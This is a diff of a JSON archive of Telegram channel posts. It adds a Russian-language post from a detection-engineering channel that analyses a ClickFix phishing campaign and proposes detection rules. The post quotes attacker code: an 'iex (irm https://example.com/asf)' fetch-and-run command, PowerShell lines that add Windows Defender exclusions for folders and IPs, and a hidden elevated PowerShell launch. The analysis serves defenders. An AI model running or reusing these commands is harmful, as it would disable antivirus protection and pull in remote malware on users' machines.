@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2025-11-27T18:35:44.152749+00:00",
-  "messages_count": 37,
+  "last_update": "2025-11-28T04:31:44.106720+00:00",
+  "messages_count": 38,
   "messages": [
+    {
+      "id": "296",
+      "title": "Давайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании",
+      "text": "Всем привет! 💻✌️\nДавайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании\n👨‍💻 Посмотрим TTP:\n🔤Атака начинается с ClickFix (имитируется обновление системы: синий экран с процентами - всё привычно), в результате чего запускается удалённый скрипт через mshta.exe\n🔤Приложение hta запускает powershell.exe с командлетами iex (irm https://example.com/asf)\n🔤Теперь самое интересное. Скачанный ps1 начинает свою работу с повышения привилегий (UAC) и добавления исключений в Windows Defender\n$uQVLE622ThHArk = \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\"\n$uQVLE622ThHArk +=\n\"; Add-MpPreference -ExclusionPath '$env:WINDIR\"\n$uQVLE622ThHArk +=\n; Add-MpPreference -ExclusionPath '$env: TEMP\"\n$uQVLE622ThHArk +=\nAdd-MpPreference -ExclusionPath '$env: USERPROFILE\"\n$uQVLE622ThHArk +=\nAdd-MpPreference -ExclusionPath '$env:APPDATA\"\n$uQVLE622ThHArk += \";\nAdd-MpPreference -ExclusionPath '$env: LOCALAPPDATA\"\n$uQVLE622ThHArk += \"; Add-MpPreference -ExclusionIpAddress '178.16.55.189', '94.154.35. 25'\n🔤Для повышения привилегий атакующие запускают powershell.exe с аргументом -Verb RunAs\n$aXNXjSqHUpLoYk = Start-Process powershell.exe\n-ArgumentList \"-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass - Command\n`$ErrorActionPreference='Stop'; $uQVLE622ThHArk\" `\n-Verb RunAs `\n-﻿PassThru\nИ, судя по отчёту, этот функционал запускается в цикле до тех пор, пока пользователь не согласится выдать привилегии\n🔤Последним этапом идёт установка RAT или стилера\n🔭 Обнаружение:\n🔤 отслеживаем аргументы powershell Add-MpPreference, Set-MpPreference, -Exclusion*\n🔤 отслеживаем создание новых значений в ключах реестра HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\\n🔤 отслеживаем события\nProviderName = \"Microsoft-Windows-Windows Defender/Operational\" AND EventId=5007 AND NewValue contains \"Microsoft\\Windows Defender\\Exclusions\"\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/296",
+      "pub_date": "2025-11-27T19:55:25+00:00"
+    },
     {
       "id": "295",
       "title": "PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows",
